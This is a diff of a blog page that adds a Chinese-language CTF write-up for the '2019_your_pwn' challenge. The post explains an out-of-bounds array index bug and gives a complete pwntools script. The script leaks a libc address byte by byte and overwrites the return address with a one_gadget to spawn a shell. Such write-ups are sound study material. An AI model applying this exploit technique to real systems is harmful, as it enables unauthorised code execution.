@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Category: STACK - ret2dlsolve | Rin</title>
+  <title>2019_your_pwn | Rin</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -57,7 +57,7 @@
 <link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <!--
-<body class="home-template">
+<body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -197,69 +197,120 @@
         <!-- ============================ Header & Logo bar =========================== -->
 
 
-      <!-- ============================ Hero Image =========================== -->
-
-<section id="hero" class="scrollme">
-    <div class="container-fluid element-img" style="background: url(https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/cover.JPG) no-repeat center center fixed;background-size: cover">
-        <div class="row">
-            <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-8 col-md-offset-2 vertical-align cover boost text-center">
-                <div class="center-me animateme" data-when="exit" data-from="0" data-to="0.6" data-opacity="0" data-translatey="100">
-                    <div>
-                        
-                        <h2><span>RIN777</span></h2>
-                        <p></p>
-                        
-                        <h2></h2>
-                        <p>努力は嘘をつく、でも無駄にはならない</p>
-                        
-
-                    </div>
-                </div>
-            </div>
-            <!-- // .col-md-12 -->
-        </div>
-        <div class="herofade beige-dk"></div>
-    </div>
-</section>
-
-<!-- Height spacing helper -->
-<div class="heightblock"></div>
-<!-- // End height spacing helper -->
-
-<!-- ============================ END Hero Image =========================== -->
-
-
-
-
-<section id="services">
+      
+<section id="intro">
     <div class="container">
-        <div class="row">
-            <div class="col-md-10 col-md-offset-1">
-                <div class="row boxes">
-                    
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2021/08/02/ret2dl_advanced/">ret2dl_advanced</a></h4>
-                            
-                            <p><time datetime="2021-08-02T03:22:53.000Z"><a href="/2021/08/02/ret2dl_advanced/">2021-08-02</a></time></p>
-                        </div>
-                    
-                </div>
-            </div>    
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2022-03-14T10:30:34.805Z" itemprop="datePublished">
+          2022-03-14
+      </time>
+    
+    
+    | 
+    <a href='/tags/stack/'>stack</a>
+    
+    
+</span>
+                <h1>2019_your_pwn</h1>
+            </div>
         </div>
-    </div>
-</section> 
+        <div class="col-md-8 col-md-offset-2">
+      		<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>​        因为是数组越界，每次只能读取一个字节，所以脚本需要循环，首先计算出偏移获取函数的地址，一般来说比较常规的思路是拿<code>libc_start_main    </code>,只是这里的偏移比较远。</p>
+<p>​    ps： 关于如何在看起来比较混乱的栈中找到偏移量这件事</p>
+<p>​        首先要搞清楚函数逻辑，就是不管有多简单也不能想当然的那种搞清楚。</p>
+<p>​        这里一共有三个关键的变量，v4，idx和v2，idx是v4数组的索引，用来leak地址。v2用来填content，最后把v2赋给<code>v4[idx]</code>。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%8810.00.59.png" alt="截屏2022-03-14 下午10.00.59"></p>
+<p>​        所以在地址上索引的地址和内容是不完全连续的。</p>
+<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8A%E5%8D%8810.45.31.png" alt="截屏2022-03-15 上午10.45.31"></p>
+<p>​        这里2e0是输入的idx，568是需要被泄露的地址，大致的索引应该是648左右，更精确的需要调试得出。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main = <span class="string">&#x27;&#x27;</span></span><br><span class="line">one_gadget = <span class="number">0x45216</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">638</span>,<span class="number">632</span>,-<span class="number">1</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;index\n&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;(hex) &#x27;</span>)</span><br><span class="line">	xx = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;value\n&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">len</span>(xx)&lt;<span class="number">2</span>):</span><br><span class="line">		libc_start_main += <span class="string">&#x27;0&#x27;</span> + xx    </span><br><span class="line">	<span class="keyword">elif</span>(<span class="built_in">len</span>(xx)==<span class="number">8</span>):</span><br><span class="line">		libc_start_main += xx[-<span class="number">2</span>:]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libc_start_main += xx</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc_start_main = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + libc_start_main,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = libc_start_main-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadget += libc_base </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):   </span><br><span class="line">	p.recvuntil(<span class="string">&#x27;index\n&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">344</span>+i))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;value\n&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="built_in">ord</span>(p64(one_gadget)[i])))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>“试着开心，好吗？”</p>
+
+
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
         </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    <a class="pull-left" href="../../15/week3-1.1/" style="float: left;">
+        ← wustctf2020_easyfast
+    </a>
+    
+    
+    <a class="pull-right" href="../../12/pwn%E4%B8%AD%E7%9A%84python%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98/">
+        pwn中的python字符串处理问题 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
     </div>
 </section>
+
+<!-- Highlight.js -->
+
+<link rel="stylesheet"
+href="//highlightjs.org/static/demo/styles/atom-one-light.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
+</script>
+<script>
+hljs.initHighlightingOnLoad();
+
+</script>
+
+
       
 <!-- ============================ Footer =========================== -->
 
